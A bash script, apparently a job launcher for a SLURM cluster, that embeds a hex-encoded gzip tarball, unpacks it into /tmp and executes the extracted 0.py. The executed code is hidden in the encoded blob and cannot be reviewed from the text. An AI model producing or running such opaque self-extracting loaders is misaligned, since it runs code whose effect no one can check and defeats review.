#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed95416fdb2014c77bcea740b9d8962202b6b1e35439eebec3b64b5555183f27a4896d01599b4dfbee033baada4ddaadeda6bddfc1189bf77ff01e0f18dddbbebb7a5598a7606c6cd9ef2dcb32f1f43e7d2fca925d11f6bad39a3859278d77f916befe42becf5d7f0fdd7c4de635e3a056a52cdab4aae70b321fe4f9d0cbe6ceee642a8a300418978dcc7956554d5a090e652d572b48659343558a3aab941275c545590958e5bc113993595de44596834a5fa8d66707d68b8ab42a78be0a7f0eb27be66cc5b92a44963545518a4ce602a41079096d219bb4ae2a284a96a9a26dd3ac653c55655ef026af52a598c82a91cf7fbc7770ff01181dceafeee3cff5cf39cf7fadff3ccfb0fedf027d1c7ae3883ddb45b808163b6977075d2f7c505a7d80596bfa2319a40b1fc965f047df9d994d68626f48a5d97ebde1b7c9b5da040d1acadbc6b159466cbc5da2841af015efe0d1c54932939369b41c4cbf07e596aa3f1e4f9d76e7e57e7f8653b78d92a5ba89c69329ba0d326efb2d9a496bc1bbbf4c914e27452c27f1f138f1ea74078f8dde82f5ae361baff2f2148b6e670fdaedc8657db41fa08b6542a4256e3d236d6f0810dd8d1da25bd2f58e00ede41168d828ce06eb38ea8dda49d3dced385b46c95af59dd3dd099edb681b1cc409f19211a551501dd73dc9257408726b23b505f2451e4ef0c198dec4d1e7ceca364c6238b928f192c3c68772889693e1f5102ca173f478df68134f1dbbf9644eb080476ddd5d7f3ff6123ff4c1680797e038ea1360a472e3c460ca4a48484862c831d55d8870cc16d6997874eaff8e5be0d982e9be7fda0a47a9bb5978c42699bdf75e4610044110044110044110044110044110044110044190ff959f2e692da800280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
